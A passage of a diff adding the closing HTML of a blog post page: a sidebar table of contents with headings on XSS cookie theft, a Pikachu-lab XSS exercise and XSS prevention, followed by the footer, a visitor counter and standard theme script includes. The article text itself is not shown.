+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss-Cookie获取"><span class="nav-number">1.</span> <span class="nav-text">xss Cookie获取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#pikachu-xss-之js输出"><span class="nav-number">1.0.0.0.1.</span> <span class="nav-text">pikachu xss 之js输出</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#四、XSS漏洞防范"><span class="nav-number">1.1.</span> <span class="nav-text">四、XSS漏洞防范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-反射型xss漏洞防范"><span class="nav-number">1.1.1.</span> <span class="nav-text">4.1 反射型xss漏洞防范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-存储型xss漏洞防范"><span class="nav-number">1.1.2.</span> <span class="nav-text">4.2 存储型xss漏洞防范</span></a></li></ol></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">erlee</span>
+
+  
+
+  
+</div>
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共15.3k字</span>
+</div>
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
